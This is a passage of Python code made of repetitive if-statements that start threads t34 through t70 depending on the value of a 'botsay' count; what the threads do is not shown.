if botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t34.start()
if botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t35.start()
if botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t36.start()
if botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t37.start()
if botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t38.start()
if botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t39.start()
if botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t40.start()
if botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t41.start()
if botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t42.start()
if botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t43.start()
if botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t44.start()
if botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t45.start()
if botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t46.start()
if botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t47.start()
if botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t48.start()
if botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t49.start()
if botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t50.start()
if botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t51.start()
if botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t52.start()
if botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t53.start()
if botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t54.start()
if botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t55.start()
if botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t56.start()
if botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t57.start()
if botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t58.start()
if botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t59.start()
if botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t60.start()
if botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t61.start()
if botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t62.start()
if botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t63.start()
if botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t64.start()
if botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t65.start()
if botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t66.start()
if botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t67.start()
if botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t68.start()
if botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t69.start()
if botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t70.start()
